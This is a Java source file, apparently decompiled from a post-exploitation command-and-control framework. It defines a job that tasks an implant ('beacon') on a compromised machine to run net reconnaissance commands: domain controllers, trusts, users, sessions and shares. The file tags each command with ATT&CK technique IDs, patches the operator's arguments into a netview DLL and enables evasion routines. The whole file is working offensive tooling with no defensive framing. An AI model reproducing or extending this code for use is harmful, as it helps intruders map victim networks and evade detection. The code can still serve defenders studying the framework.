package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class NetViewJob extends Job {
    protected String command;

    protected String target;

    protected String param;

    public NetViewJob(TaskBeacon taskBeacon, String string1, String string2, String string3) {
        super(taskBeacon);
        this.command = string1;
        this.target = string2;
        this.param = string3;
    }

    public String getTactic() {
        if (CommonUtils.toSet("computers, dclist, domain_controllers, domain_trusts, view").contains(this.command)) {
            return "T1018";
        }
        if (CommonUtils.toSet("group, localgroup, user").contains(this.command)) {
            return "T1087";
        }
        if (CommonUtils.toSet("logons, sessions").contains(this.command)) {
            return "T1033";
        }
        if ("share".equals(this.command)) {
            return "T1135";
        }
        if ("time".equals(this.command)) {
            return "T1124";
        }
        return "";
    }

    public boolean ignoreToken() {
        return false;
    }

    public String getDescription() {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("Tasked beacon to run net " + this.command);
        if (this.param != null)
            stringBuffer.append(" " + this.param);
        if (this.target != null)
            stringBuffer.append(" on " + this.target);
        return stringBuffer.toString();
    }

    public String getShortDescription() {
        return "net " + this.command;
    }

    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/netview.x64.dll";
        }
        return "resources/netview.dll";
    }

    public String getPipeName() {
        return "netview";
    }

    public int getCallbackType() {
        return 24;
    }

    public int getWaitTime() {
        return 30000;
    }

    public byte[] fix(byte[] arrby) {
        Packer packer = new Packer();
        packer.little();
        packer.addWideString(this.command, 2048);
        if (this.target != null) {
            packer.addWideString(this.target, 2048);
        } else {
            packer.pad(Character.MIN_VALUE, 2048);
        }
        if (this.param != null) {
            packer.addWideString(this.param, 2048);
        } else {
            packer.pad(Character.MIN_VALUE, 2048);
        }
        String str = CommonUtils.bString(packer.getBytes());
        return CommonUtils.patch(arrby, "PATCHME!12345", str);
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
